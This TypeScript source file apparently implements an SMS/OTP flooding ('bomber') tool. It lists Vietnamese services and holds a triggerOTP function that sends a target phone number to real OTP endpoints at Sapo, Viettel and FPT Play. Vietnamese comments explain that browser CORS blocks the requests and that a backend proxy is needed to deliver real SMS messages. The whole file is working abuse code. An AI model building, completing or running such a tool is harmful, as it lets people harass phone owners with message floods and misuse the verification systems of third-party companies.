
import { ServiceDefinition } from '../types';

export const OTP_SERVICES: ServiceDefinition[] = [
  { id: 'sapo', name: 'Sapo OTP', category: 'Retail', status: 'Idle' },
  { id: 'viettel', name: 'Viettel Login', category: 'Telco', status: 'Idle' },
  { id: 'fptplay', name: 'FPT Play', category: 'Media', status: 'Idle' },
  { id: 'shopee', name: 'Shopee VN', category: 'Retail', status: 'Idle' },
  { id: 'tiki', name: 'Tiki VN', category: 'Retail', status: 'Idle' },
  { id: 'vnpay', name: 'VNPay', category: 'Finance', status: 'Idle' },
  { id: 'ghn', name: 'GHN Express', category: 'Retail', status: 'Idle' },
  { id: 'ahamove', name: 'Ahamove', category: 'Retail', status: 'Idle' },
];

export const triggerOTP = async (serviceId: string, phone: string): Promise<{ success: boolean; response: string }> => {
  try {
    let response;
    // Chú ý: Các yêu cầu này hầu hết sẽ bị chặn bởi CORS trên môi trường Browser thuần túy.
    // Cần một Backend Proxy (NodeJS/Python server) để thực sự vượt qua rào cản này.
    switch (serviceId) {
      case 'sapo':
        response = await fetch('https://www.sapo.vn/fnb/sendotp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `phone=${phone}`
        });
        break;
      case 'viettel':
        response = await fetch('https://viettel.vn/api/getOTPLoginCommon', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, type: 1 })
        });
        break;
      case 'fptplay':
        response = await fetch('https://api.fptplay.net/api/v7.1_w/user/otp/register_otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: phone })
        });
        break;
      default:
        // Giả lập cho các dịch vụ khác nếu chưa có endpoint cụ thể
        throw new Error("CORS_BLOCKED: Browser security policy prevented this request.");
    }

    if (response && response.ok) {
      return { success: true, response: "OK" };
    } else {
      return { success: false, response: `Status: ${response?.status || 'Blocked'}` };
    }
  } catch (error) {
    // Trình duyệt sẽ nhảy vào đây vì lỗi CORS
    console.error(`Error calling ${serviceId}:`, error);
    return { 
      success: false, 
      response: "CORS Blocked: Cần chạy qua Backend để gửi SMS thật." 
    };
  }
};
